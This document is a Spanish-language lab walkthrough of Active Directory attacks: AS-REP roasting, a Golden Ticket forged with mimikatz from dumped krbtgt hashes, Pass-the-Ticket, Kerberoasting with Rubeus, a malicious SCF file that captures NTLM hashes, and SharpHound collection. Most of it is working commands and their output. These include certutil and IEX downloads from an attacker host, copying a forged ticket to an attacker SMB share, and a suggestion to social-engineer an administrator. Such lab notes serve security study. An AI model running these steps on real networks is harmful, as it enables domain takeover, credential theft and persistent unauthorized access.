## <mark style="color:purple;">Ataque ASReproast (Practica)</mark>

Ahora si queremos hacernos una lista de usuarios del dominio para extraer su hash, podremos hacerlo de la siguiente forma:

```shell
rpcclient -U "d1sec0rp.local\mvazquez%Password1" 192.168.5.150 -c 'enumdomusers' | grep -oP '\[.*?\]' | grep -v '0x' | tr -d '[]' > users
```

Ahora cambiaremos una configuracion en el servidor `DC` que algunas empresas de forma real se pueden dejar y donde nosotros como atcantes podremos aprovechar.

Nos iremos a `Herramientas` -> `Usuarios y equipos de Active Directory` -> Abrir la carpeta `d1sec0rp.local` y donde pone `Users` irnos al `SVC_SQLservice`, darle doble click para abrirlo -> `Cuenta` -> marcamos la casilla llamada `No pedir la autenticacion Kerberos previa` y con esto tendria una vulnerabilidad que se puede aprovechar de la siguiente forma.

En la maquina atacante ejecutamos el siguiente codigo para probar fuerza bruta con la lista de usuarios que creamos anteriormente:

```shell
impacket-GetNPUsers d1sec0rp.local/ -no-pass -usersfile users
```

Info:

```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

/usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[-] User Administrador doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User mvazquez doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ramlux doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User test doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc_sqlservice@D1SEC0RP.LOCAL:508ed46bc3316bd03154375513477c33$2d6728074e785828f5bb5f14a28ef1c66cbc74ea570a4c891fbb5c0e809848c537fb38d15e421ff04397df1bbe2ca6af75c79201a98ed5a2e9a1fc10e861530f3a30074465fe77c3e49d6c6f347d731abb4a29e869132f8cba7fa792acc1e7862dcbb15fdf891267ba314490d56ea09e2f28c1631be918d7403bed9ba5c536972dd59ef56a6b2a04a121edebee51858168a8ff17ea1f870812d2b2ed89a7ca3820b0cdbd27c48a2cd0a1f01e39025382de36481c951f2b16030de0c251a49d3235acc3126703a955813021c41a0e0b5ee8f36eb929dc67b1e70c6ae520d5fa4c33930b8e3a74bc79cf5f9c7d1aa7149e
```

Con esto obtendriamos un hash, el cual podremos intentar crackear con `john`, que sera la misma contraseña que ya obtuvimos ya que es del mismo usuario, pero con otro hash, extraido de otra forma.

## Golden Ticket Attack (Practica)

En este caso volveremos a conectarnos a la maquina victima pero con `psexec`:

```shell
impacket-psexec d1sec0rp.local/Administrador:'P@$$w0rd!'@192.168.5.150 cmd.exe
```

Una vez que estemos dentro hacemos lo siguiente:

```shell
cd C:\Windows\Temp
mkdir test
cd test
```

Y desde la maquina atacante nos copiaremos el `mimikatz.exe` a nuestro directorio actual, para transferirlo a la maquina victima:

```shell
locate mimikatz.exe
cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .
python3 -m http.server
```

Y en la maquina victima lo cargaremos de la siguiente forma:

```shell
certutil.exe -f -urlcache -split http://192.168.5.147:8000/mimikatz.exe mimikatz.exe
```

Y lo ejecutamos de la siguiente forma:

```shell
mimikatz.exe
```

Info:

```

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
  
  mimikatz #
```

Y ponemos lo siguiente:

```shell
lsadump::lsa /inject /name:krbtgt
```

Info:

```
mimikatz # Domain : D1SEC0RP / S-1-5-21-2318059739-1265623959-3235901501

RID  : 000001f6 (502)
User : krbtgt

 * Primary
    NTLM : f586595761bf8c3ca29e776b7ab0e94f
    LM   : 
  Hash NTLM: f586595761bf8c3ca29e776b7ab0e94f
    ntlm- 0: f586595761bf8c3ca29e776b7ab0e94f
    lm  - 0: 17bb2f08d28145352067fa30316b8586

 * WDigest
    01  dc4fed6cbabb835764880d767417a9ce
    02  5b05d10fdaa8cdfbab2029d7ef09df94
    03  585b4bfeb668ce872c3119c7b3d064a9
    04  dc4fed6cbabb835764880d767417a9ce
    05  5b05d10fdaa8cdfbab2029d7ef09df94
    06  847f01f04e6feb641ccf0b20a955c08f
    07  dc4fed6cbabb835764880d767417a9ce
    08  70a09a05279b47487c7978db03c1392a
    09  70a09a05279b47487c7978db03c1392a
    10  0f98df6f26793a40b7fa04a19299cdcc
    11  c9214cc7689f0b57bd9a41a931b6c680
    12  70a09a05279b47487c7978db03c1392a
    13  cb408214d5c6eaa69cc0798c7a98401a
    14  c9214cc7689f0b57bd9a41a931b6c680
    15  10cdb2f94f288f9cc9035ebb2d6c721a
    16  10cdb2f94f288f9cc9035ebb2d6c721a
    17  58ce9272876f20337e2d4f379a0417e7
    18  cf1cc0d31d43358af9902364d062a4b2
    19  3f296c53db1849e4d7bc14471ef6f6b5
    20  00b28cedd2b27241e31bcdc2275b7e2a
    21  8eb5871ece735ed6d5de20c0d58163ad
    22  8eb5871ece735ed6d5de20c0d58163ad
    23  9cb00f2dcc60dae04b68ab2b713799f5
    24  783f66f2c8ae961b248c8706000070a8
    25  783f66f2c8ae961b248c8706000070a8
    26  ffdd38a86da70e917a2977ea763c397d
    27  f271e0a63a09b95e98ffcad092bc1116
    28  7d2bcdf1d4c4cc125a36c63a3548c627
    29  c2ce07ffdfef9deaba10673ec41884bf

 * Kerberos
    Default Salt : D1SEC0RP.LOCALkrbtgt
    Credentials
      des_cbc_md5       : a4a1c27643a1b651

 * Kerberos-Newer-Keys
    Default Salt : D1SEC0RP.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 32804d82eb703492c198266c3bda731d8a2b4a1e028992ba1607c39292a57379
      aes128_hmac       (4096) : a00cc108f7298f1a37fee8a3eff0f855
      des_cbc_md5       (4096) : a4a1c27643a1b651

 * NTLM-Strong-NTOWF
    Random Value : 03d6a540407038548ff4fd157008b6b5
```

Con esto dumpeamos la informacion para posteriormente utilizarla en el ataque `Golden Ticket` seguiremos de la siguiente forma:

```shell
kerberos::golden /domain:d1sec0rp.local /sid:S-1-5-21-2318059739-1265623959-3235901501 /rc4:f586595761bf8c3ca29e776b7ab0e94f /user:Administrador /ticket:golden.kirbi
```

El parametro `/sid:` corresponde con el id del usuario que esta al principio de la informacion

El parametro `/rc4:` corresponde con el hash NTLM del usuario que esta en la informacion

El parametro `/user:` corresponde con el usuario que queremos "impersonalizar"

Info:

```
mimikatz # User      : Administrador
Domain    : d1sec0rp.local (D1SEC0RP)
SID       : S-1-5-21-2318059739-1265623959-3235901501
User Id   : 500
Groups Id : *513 512 520 518 519 
ServiceKey: f586595761bf8c3ca29e776b7ab0e94f - rc4_hmac_nt      
Lifetime  : 27/10/2024 19:06:21 ; 25/10/2034 19:06:21 ; 25/10/2034 19:06:21
-> Ticket : golden.kirbi

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Final Ticket Saved to file !
```

Con esto lo que hacemos es crearnos un archivo llamado `golden.kirbi`, por lo que si nos salimos con `exit` y listamos, veremos lo siguiente:

```
Directorio de C:\Windows\Temp\test

27/10/2024  19:06    <DIR>          .
27/10/2024  19:06    <DIR>          ..
27/10/2024  19:06             1.409 golden.kirbi
27/10/2024  18:55         1.355.264 mimikatz.exe
               2 archivos      1.356.673 bytes
               2 dirs   7.736.471.552 bytes libres
```

Veremos que el archivo se creo correctamente.

Y ahora esto nos lo traeremos a nuestro equipo atacante de la siguiente forma, nos iremos a la maquina atacante:

```shell
impacket-smbserver smbFolder $(pwd) -smb2support 
```

Y mientras eso esta activo, en la maquina victima pondremos lo siguiente:

```shell
copy golden.kirbi \\192.168.5.147\smbFolder\golden.kirbi
```

Esto en el `smbserver` pondra algo como:

```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (192.168.5.150,52130)
[*] AUTHENTICATE_MESSAGE (D1SEC0RP\DC-COMPANY$,DC-COMPANY)
[*] User DC-COMPANY\DC-COMPANY$ authenticated successfully
[*] DC-COMPANY$::D1SEC0RP:aaaaaaaaaaaaaaaa:4b9614449917b448c3743fef30f82a0f:010100000000000000b847919b28db0135f114d0f2752ecf00000000010010004500660062004d0062004c0065007800030010004500660062004d0062004c006500780002001000610075004b00750050004a006a00700004001000610075004b00750050004a006a0070000700080000b847919b28db0106000400020000000800300030000000000000000000000000400000d35ca906ae21cdbc1815bb16de444bdb59e96104ab913da5f909cf81b44da3410a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e0035002e00310034003700000000000000000000000000
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:smbFolder)
```

Por lo que lo transferimos bien.

Y si listamos en nuestra maquina atacante, veremos el `golden.kirbi`.

Ahora nos conectaremos mediante el usuario administrador al equipo de `ramlux`:

```shell
impacket-psexec d1sec0rp.local/Administrador:'P@$$w0rd!'@192.168.5.149 cmd.exe
```

Con la IP del equipo `ramlux`, una vez echo esto estariamos dentro.

```shell
cd C:\Windows\Temp
mkdir test
cd test
```

```shell
dir \\DC-Company\c$
```

Info:

```
Acceso denegado.
```

Nos pondria eso, por que nosotros no tenemos acceso a esos recursos aunque seamos admins, pero para poder tener acceso a esos recursos se podria hacer lo siguiente:

```shell
python3 -m http.server
```

Y en la maquina victima nos pasamos el `mimikatz.exe`:

```shell
certutil.exe -f -urlcache -split http://192.168.5.147:8000/mimikatz.exe mimikatz.exe

certutil.exe -f -urlcache -split http://192.168.5.147:8000/golden.kirbi golden.kirbi
```

Y si listamos veremos que se paso bien:

```
Directorio de C:\Windows\Temp\test

27/10/2024  19:32    <DIR>          .
27/10/2024  19:32    <DIR>          ..
27/10/2024  19:32             1.409 golden.kirbi
27/10/2024  19:32         1.355.264 mimikatz.exe
               2 archivos      1.356.673 bytes
               2 dirs   2.303.995.904 bytes libres
```

### Pass-The-Ticket Tecnica

Una vez que ya hemos echo el `Golden Ticket` podremos hacer la tecnica de `Pass-The-Ticket` que se hara de la siguiente forma:

cargaremos el `mimikatz.exe`:

```shell
mimikatz.exe
```

Despues haremos lo siguiente:

```shell
kerberos::ptt golden.kirbi
```

Info:

```
mimikatz # 
* File: 'golden.kirbi': OK
```

Y si ahora nos salimos con `exit` y volvemos a ejecutar el comando para poder ver lo que hay en `c$`, veremos lo siguiente:

```shell
dir \\DC-Company\c$
```

Info:

```
Directorio de \\DC-Company\c$

16/07/2016  14:23    <DIR>          PerfLogs
27/10/2024  14:59    <DIR>          Program Files
27/10/2024  14:59    <DIR>          Program Files (x86)
27/10/2024  17:51    <DIR>          Users
27/10/2024  19:13    <DIR>          Windows
               0 archivos              0 bytes
               5 dirs   7.733.579.776 bytes libres
```

Ya no nos pone `Acceso Denegado`, ahora podremos ver lo que queramos.

Pero para tener acceso a la maquina directamente, podremos hacer lo siguiente:

```shell
impacket-ticketer -nthash f586595761bf8c3ca29e776b7ab0e94f -domain-sid S-1-5-21-2318059739-1265623959-3235901501 -domain d1sec0rp.local Administrador
```

Info:

```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
/usr/share/doc/python3-impacket/examples/ticketer.py:141: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  aTime = timegm(datetime.datetime.utcnow().timetuple())
[*] Customizing ticket for d1sec0rp.local/Administrador
/usr/share/doc/python3-impacket/examples/ticketer.py:600: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  ticketDuration = datetime.datetime.utcnow() + datetime.timedelta(hours=int(self.__options.duration))
/usr/share/doc/python3-impacket/examples/ticketer.py:718: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  encTicketPart['authtime'] = KerberosTime.to_asn1(datetime.datetime.utcnow())
/usr/share/doc/python3-impacket/examples/ticketer.py:719: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  encTicketPart['starttime'] = KerberosTime.to_asn1(datetime.datetime.utcnow())
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
/usr/share/doc/python3-impacket/examples/ticketer.py:843: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  encRepPart['last-req'][0]['lr-value'] = KerberosTime.to_asn1(datetime.datetime.utcnow())
[*] 	EncAsRepPart
[*] Signing/Encrypting final ticket
[*] 	PAC_SERVER_CHECKSUM
[*] 	PAC_PRIVSVR_CHECKSUM
[*] 	EncTicketPart
[*] 	EncASRepPart
[*] Saving ticket in Administrador.ccache
```

Y con esto habriamos creado el archivo `Administrador.ccache`.

Por lo que ahora para tener persistencia absoluta en el `DC` haremos lo siguiente:

De primeras vamos a exportar una variable de entorno que la llamaremos asi:

```shell
export KRB5CCNAME="/home/dise0/Desktop/AD/Administrador.ccache"
```

Comprobamos que se haya cargado correctamente:

```shell
ls -l $KRB5CCNAME
```

Info:

```
.rw-r--r-- root root 1.2 KB Sun Oct 27 14:42:54 2024  /home/dise0/Desktop/AD/Administrador.ccache
```

Y vemos que si.

Ahora vamos a conectarnos desde el `psexec` pero sin ninguna contraseña de la siguiente forma:

```shell
impacket-psexec -n -k d1sec0rp.local/Administrador@DC-Company cmd.exe
```

Info:

```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on DC-Company.....
[*] Found writable share ADMIN$
[*] Uploading file BBduwycn.exe
[*] Opening SVCManager on DC-Company.....
[*] Creating service GqCe on DC-Company.....
[*] Starting service GqCe.....
[!] Press help for extra shell commands
[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
Microsoft Windows [Versi�n 10.0.14393]

(c) 2016 Microsoft Corporation. Todos los derechos reservados.

C:\Windows\system32> 
```

Y con esto ya estariamos dentro de nuevo, de una forma persistente.

Ahora por ejemplo si se le cambiara la contraseña al `Administrador` con ese comando podremos seguir metiendonos autenticado como el `Administrador` de forma persistente.

### Rubeus.exe (Otra herramienta)

Tambien se puede hacer eso mismo pero con otra herramienta, de la siguiente forma.

```shell
git clone https://github.com/r3motecontrol/Ghostpack-CompiledBinaries.git
cd Ghostpack-CompiledBinaries/
```

Despues de haberlo descargado, haremos lo siguiente:

```shell
impacket-psexec -n -k d1sec0rp.local/Administrador@DC-Company cmd.exe
```

Nos volveremos a meter.

```shell
cd C:\Windows\Temp\test
```

Nos subimos el `rubeus.exe` a la maquina victima.

En la maquina atacante (Donde este el archivo):

```shell
python3 -m http.server
```

Y en la maquina victima:

```shell
certutil.exe -f -urlcache -split http://192.168.5.147:8000/Rubeus.exe Rubeus.exe
```

Podremos hacer el mismo ataque de `Kerberoasting` pero de esta forma, poniendo cualquier usuario, mientras sea valido a nivel de dominio.

```shell
rubeus.exe kerberoast /creduser:d1sec0rp.local\mvazquez /credpassword:Password1
```

Info:

```
   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0 


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target Domain          : d1sec0rp.local
[*] Searching path 'LDAP://DC-Company.d1sec0rp.local/DC=d1sec0rp,DC=local' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1


[*] SamAccountName         : svc_sqlservice
[*] DistinguishedName      : CN=SVC_SQLservice,CN=Users,DC=d1sec0rp,DC=local
[*] ServicePrincipalName   : d1sec0rp.local/SVC_SQLservice.DC-Company
[*] PwdLastSet             : 27/10/2024 17:22:12
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*svc_sqlservice$d1sec0rp.local$d1sec0rp.local/SVC_SQLservice.DC-Comp
                             any@d1sec0rp.local*$A6E119D232688F2292E2908D6CF91A9D$65F265FEDE4116CE184075A2764
                             BE5B7A29B647D56337ABD46517D59497C4E132487E616E1731C237E7CE0AFE41569EC0F5EB8DF1DD
                             5D2F3BE8765F65D7C8736802503CE001A9B8499B3ABCB9B515F909092C092D891DC255D778B21DA4
                             69240C4F5C01F06FBE2EC9E9A39D208CA62F0E9FA540BADA3A22545CCB53A757245D256E60CBA5A4
                             E1926AA8367741A60F17C4A95F59CB7C5308457A5E986F3E1D8F15C27FF1A843D4878486A77CE0F2
                             87A144EAEBC7AD8272DAE0A9BA3F869B53C811311B5438A30A9639C6C4F7F4192A205D0744B709D6
                             B11067D003827F6D6DCD5BA3D28FAA42A07EA23EE3D7E79446FB7E4BF5A5BB1987EE36FB8AAF1F9F
                             C98117978D0E5B96A2F0BB8C50FBEF3D96F1ED0866FAF1E4D52D5B6A60C63D13198C95E94FFE83AC
                             4D7F92475F43414C30937940233249D47BDE97193F2A307A145403966640885A8433532F61C55B5A
                             6E0B291F7EE97832EDC1A7C8CCACFCD9425B2457346514EED78FE8197912F2D9163B4DA990489A49
                             1C48DC914E8C5EDF9C7A6361B154FA589D70A5B771380298B810328CDC6F42EC4E44AF036CC6966E
                             06C71BF7821EE9275D721275C5D9A1C1CE3623F0C3B86CC113FFF96623CD8723BDAD2CF8DE5D5FC7
                             02580A6D2109C2FB6501C4EDF5C5FE3922892C00E2BD5CD0F5F0A4D7B1A6D1336D670BF99892977D
                             F8EE5A0DD976B6DAD33458309A98FBB7558977D325242C7514C0DCBA8F16B04F098E567C8568D3DF
                             B8894FB56026954840A65ED1ACFC6C9A82A209F3830F537F324392162B26773F0F36933CA6EECE6D
                             AAF608451A2A0472792DE70FF49BABAB8713340E5A60FF5439B4ACB75EF8996BAE44EFCEE9D7630A
                             CA3266E68364F8DC827A405991AA6A8DA756BC8B2D9F652FA85FA04A6BB6A02E25904ECCEDB70674
                             5C10CB154C0488F5965D01E9B4F1940C7FC3406FC1EE7E2C0E3FD3D891442FED5D6498A92275353B
                             5E9EECB2A870D0F85FE34034BC7EA9B2EE5826744E66AE6AAAEDC36FB933C12AE9D8610E562D551E
                             775A54D22CE0B2A35501F19CF95AAF22FCB4DCE8E806469120EACD91B3F73FC54B6BE8F997AF767A
                             464101203CBC69B1DCDB2C4F45B682AEAA35F2CEACB6A1DF9251D87D91B40F89796CD43B3270B813
                             27A5B62B6934E7A297F536CAAB8283A85B7C74F3A4FA3E9DD70B3D23ADB305E904F9A56A2D071CB2
                             2B1D8BE720AE06E89A6D1061E427D790C985B071A8F50DE086A571E705B271652CB42AD7727EBC81
                             7493B7DCB245CDBED176B3434B50853C07418557EB53184ED53E9EC1E03789B415D69F5FDF70B39C
                             27E321898C6734BD63BA563FCBA2AD4EC0FF7C49844286E7E59BA4FBC000C00FBBE7F298D6CD66CF
                             D97D545AB89E82359DDF3D1BB50F037880B5F811D151E914A629764EFE922975E496B350BE476907
                             B4E2B3156E1524898D2DDB6C30596272A0C02414153E274B2A7E610AAE8B274
```

Obtendriamos lo mismo que la tecnica anterior del `Kerberoasting`, pero con esta herramienta.

Ahora si lo queremos hacer sin contarseña, se podria hacer de la siguiente forma:

```shell
rubeus.exe asreproast /user:SVC_SQLservice /domain:d1sec0rp.local /dc:DC-Company
```

Para el parametro `/user:` tendremos que poner el usuario que es vulnerable a `ASReproasting`, que en mi caso es `SVC_SQLservice`

Info:

```
  ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0 


[*] Action: AS-REP roasting

[*] Target User            : SVC_SQLservice
[*] Target Domain          : d1sec0rp.local
[*] Target DC              : DC-Company

[*] Using domain controller: DC-Company (fe80::14f:c011:d531:654f%2)
[*] Building AS-REQ (w/o preauth) for: 'd1sec0rp.local\SVC_SQLservice'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$SVC_SQLservice@d1sec0rp.local:ADDCAF76951D71BE9005ED651CF7F615$ECF7C2
      103361DDB3EA973C5F5F7297E4EC83D4F7A9B11F35753069799BBFA07339A8D3F142D2733C4A5ECD
      AE38E4223A65DDCA15CC5B8940892BFABDA5CE301C59804C7BE690F82E6A99E8AA01F444BD89BCF0
      B20A4E2FA9E26AEC0702B9939F08579D3A2DEFD081B282A5E68B3B4539B9F2EF703FF18D8B9452A4
      81220B678EDA0A1DC4B2A3F983AF70E14E41EBF2433C47FF7FD14839A3EEFDE86FC8D40085D0B662
      F66619C0EB825B80075585972B6367D68AC1BB737189A511D9E32C16228E5D3B666B92B394DE5041
      A816A2A1324FEF019D304028A33DFFA1D3A0C403F11994F0FDF135A82ACB3D45A4180E8749
```

Aqui veriamos el hash del usuario que ha sido vulnerable por la `ASReproast` e intentar crackearlo.

## <mark style="color:purple;">Archivos SCF (Practica)</mark>

Para hacerlo mas realista, pueden existir los archivos llamados `SCF`.

Para configurar todo esto, nos iremos al servidor `DC` y donde el panel de `Administrador del servidor` haremos lo siguiente.

`Servicios de archivos y almacenamiento` -> `Recursos Compartidos` -> `Tareas` -> `Nuevo recurso compartido` -> `Siguiente` -> marcar la opcion de `Ruta de acceso personalizada`, creamos una carpeta en el escritorio llamada `sahreFiles`, volvemos al panel, le daremos a `Examinar` y seleccionamos la carpeta creada (`C:\Users\Administrador.WIN-61G5HU91UG1\Desktop\sharedFiles`) -> `Siguiente` -> `Siguiente` -> marcamos la casilla `Habilitar enumeracion basada en el acceso` -> `Siguiente` -> `Personalizar permisos` -> `Agregar` -> `Seleccionar una entidad de seguridad` -> ponemos las iniciales del usuario que va a poder subir archivos a ese directorio (Ejemplo: `mvaz`) y ya lo detecta solo -> `Aceptar` -> marcamos todas las casillas para que pueda hacer de todo -> `Aceptar` -> `Aplicar` -> `Aceptar` -> `Siguiente` -> `Crear` -> `Cerrar`

Ahora si nos vamos a nuestra maquia atacante y hacemos lo siguiente:

```shell
smbclient -U "d1sec0rp.local\mvazquez%Password1" -L 192.168.5.150
```

Info:

```

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Admin remota
	C$              Disk      Recurso predeterminado
	IPC$            IPC       IPC remota
	NETLOGON        Disk      Recurso compartido del servidor de inicio de sesión 
	sharedFiles     Disk      
	SYSVOL          Disk      Recurso compartido del servidor de inicio de sesión 
```

Listamos los recursos compartidos del servidor, por lo que vemos se ve el que creamos `shareFiles`.

Y si tratamos de intentar conectarnos con el usuario `mvazquez` veremos que si podemos:

```shell
smbclient -U "d1sec0rp.local\mvazquez%Password1" //192.168.5.150/sharedFiles
```

Una vez estando dentro podremos subir, escribir y hacer lo que queramos ya que le dimos permisos para ello.

Ahora como atacante crearemos un archivo malicioso que subiremos al `SMB` como por ejemplo:

En la maquina atacante crearemos lo siguiente:

```shell
nano file.scf

#Dentro del nano

[Shell]
Command=2
IconFile=\\192.168.5.147\smbFolder\test.ico
[Taskbar]
Command=ToggleDesktop
```

Y ahora desde el `SMB` lo subimos:

```shell
put file.scf
```

Info:

```
putting file file.scf as \file.scf (30.6 kb/s) (average 30.6 kb/s)
```

Con esto ya lo habriamos subido perfectamente.

Ahora si nos ponemos en escucha con `smbserver` de la siguiente forma en la maquina atacante:

```shell
impacket-smbserver smbFolder $(pwd) -smb2support
```

Ahora si con ingenieria social, le dices al que lleva el servidor `DC` que habra la carpeta compartida por que hay algo raro, solo con el simple echo de que habra esa carpeta desde el server, veremos en nuestra maquina atacante lo siguiente:

```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (192.168.5.150,56613)
[*] AUTHENTICATE_MESSAGE (D1SEC0RP\Administrador,DC-COMPANY)
[*] User DC-COMPANY\Administrador authenticated successfully
[*] Administrador::D1SEC0RP:aaaaaaaaaaaaaaaa:9a53d50a73c36c8ab9446d52fd1a4246:0101000000000000001a7511aa28db018d1f5fcf3c719dcb00000000010010006d0064005600750079006a0061007400030010006d0064005600750079006a0061007400020010006b004c0079006c007300460061004b00040010006b004c0079006c007300460061004b0007000800001a7511aa28db0106000400020000000800300030000000000000000000000000300000d35ca906ae21cdbc1815bb16de444bdb59e96104ab913da5f909cf81b44da3410a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e0035002e00310034003700000000000000000000000000
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:smbFolder)
```

Y con esto tendriamos el hash NTLM del usuario `Administardor`, con el que podriamos probar a crackear, etc...

## BloodHound y Neo4j (Practica)

Podremos utilizar estas 2 herramientas para poder hacer lo siguiente, pero antes las instalaremos:

```shell
apt install bloodhound neo4j
```

Si no funcionara cambiar del `java 8` al `java 11`:

```shell
update-alternatives --config java
```

Ahora utilizaremos la primera herramienta:

```shell
neo4j console
```

Info:

```
Directories in use:
home:         /usr/share/neo4j
config:       /usr/share/neo4j/conf
logs:         /etc/neo4j/logs
plugins:      /usr/share/neo4j/plugins
import:       /usr/share/neo4j/import
data:         /etc/neo4j/data
certificates: /usr/share/neo4j/certificates
licenses:     /usr/share/neo4j/licenses
run:          /var/lib/neo4j/run
Starting Neo4j.
2024-10-27 20:05:26.317+0000 INFO  Starting...
2024-10-27 20:05:26.914+0000 INFO  This instance is ServerId{c17fe76d} (c17fe76d-6e53-4170-a697-8a644511923b)
2024-10-27 20:05:28.381+0000 INFO  ======== Neo4j 4.4.26 ========
2024-10-27 20:05:30.588+0000 INFO  Initializing system graph model for component 'security-users' with version -1 and status UNINITIALIZED
2024-10-27 20:05:30.596+0000 INFO  Setting up initial user from defaults: neo4j
2024-10-27 20:05:30.597+0000 INFO  Creating new user 'neo4j' (passwordChangeRequired=true, suspended=false)
2024-10-27 20:05:30.609+0000 INFO  Setting version for 'security-users' to 3
2024-10-27 20:05:30.610+0000 INFO  After initialization of system graph model component 'security-users' have version 3 and status CURRENT
2024-10-27 20:05:30.614+0000 INFO  Performing postInitialization step for component 'security-users' with version 3 and status CURRENT
2024-10-27 20:05:30.905+0000 INFO  Bolt enabled on localhost:7687.
2024-10-27 20:05:31.661+0000 INFO  Remote interface available at http://localhost:7474/
2024-10-27 20:05:31.665+0000 INFO  id: BE25545297010375BEB448C33B00884D58F5B4CF1D036CA860B034002903FA6B
2024-10-27 20:05:31.665+0000 INFO  name: system
2024-10-27 20:05:31.665+0000 INFO  creationDate: 2024-10-27T20:05:29.092Z
2024-10-27 20:05:31.665+0000 INFO  Started.
```

Y en otra terminal ejecutamos la segunda:

```shell
bloodhound &>/dev/null &
```

Lo convertimos en un proceso padre:

```shell
disown
```

Y dentro del panel `bloodhound` pondremos las credenciales por defecto `neo4j:neo4j` y nos pedira cambiarlas, las cambiamos y nos logearemos (Con esto lo que haremos sera sacar toda la informacion del dominio)

Pero las credenciales hay que cambiarlas en esta URL `http://localhost:7474/browser/`

Una vez echo todo el proceso y estando dentro, lo dejaremos ahi y en la terminal nos conecatmos mediante `winrm`:

```shell
evil-winrm -u 'SVC_SQLservice' -p 'mypassword123#' -i 192.168.5.150
```

Y en otra terminal creamos el archivo malicioso:

URL = [SharpHound.ps1](https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1)

```shell
nano SharpHound.ps1

#Dentro del nano
<Contenido de la URL>
```

Lo guardamos y lo importamos a la maquina victima.

Abrimos un servidor de `python3` en el equipo atacante:

```shell
python3 -m http.server
```

Y en la maquina victima ponemos lo siguiente:

```shell
IEX(New-Object Net.WebClient).downloadString('http://192.168.5.147:8000/SharpHound.ps1')
```

Con esto ya nos habriamos pasado el archivo `.ps1`

Seguidamente ejecutamos lo siguiente:

```shell
Invoke-BloodHound -CollectionMethods All
```

Y si hacemos un `dir` veremos un `.zip` el cual nos descargaremos con el comando `download`

Y ahora desde el panel `BloodHund` podremos subir el archivo `.zip` y con el panel de la izquierda en la parte de `Analysis` podremos ejecutar varias acciones en las cuales nos dara informacion sobre el dominio entero para saber por donde atacar.

> NOTA

